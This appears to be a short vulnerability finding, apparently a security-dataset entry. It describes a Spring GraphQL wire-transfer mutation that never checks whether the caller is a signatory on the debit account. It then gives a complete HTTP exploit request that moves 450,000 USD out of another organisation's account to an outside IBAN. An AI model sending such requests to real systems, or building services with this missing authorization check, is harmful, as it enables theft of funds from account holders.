diagnosis: The Spring GraphQL mutation resolver loads the source debit account directly by UUID argument and dispatches high-value wire transfers without asserting that the authenticated user is an authorized signatory on that account. Any authenticated client can drain funds from external corporate treasury accounts by supplying foreign account UUIDs in GraphQL mutation requests.
exploit_request:
POST /graphql HTTP/1.1
Host: treasury.apexbank.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzg4MSIsIm9yZyI6IkNPUlAtQSJ9.sig
Content-Type: application/json

{"query": "mutation { initiateWireTransfer(debitAccountId: \"9c2a1e45-77b3-4f12-98aa-1234567890ab\", input: { recipientIban: \"GB29XABC60161331926819\", amount: 450000.00, currency: \"USD\" }) { transactionReference status } }"}
